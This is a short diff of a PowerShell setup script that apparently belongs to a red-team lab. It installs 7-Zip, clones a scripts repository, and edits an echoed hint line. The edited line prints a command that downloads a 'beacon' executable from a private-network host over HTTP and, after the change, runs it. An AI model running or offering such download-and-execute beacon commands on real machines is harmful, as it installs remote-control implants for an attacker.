@@ -13,5 +13,5 @@ Invoke-WebRequest -Uri "https://www.7-zip.org/a/7z2201-x64.exe" -OutFile "$home\
 cd $home/desktop
 git clone https://github.com/jacobvanderwyst/bashscripts.git
 cd ..
-echo "run to download beacon iwr http://192.168.242.130:8000/ELEGANT_DIAPHRAGM.exe -o ~/desktop/elegant_diaphram.exe"
+echo "run to download beacon iwr http://192.168.242.130:8000/ELEGANT_DIAPHRAGM.exe -o ~/desktop/elegant_diaphram.exe && ~/desktop/elegant_diaphram.exe"
 Set-ExecutionPolicy Restricted
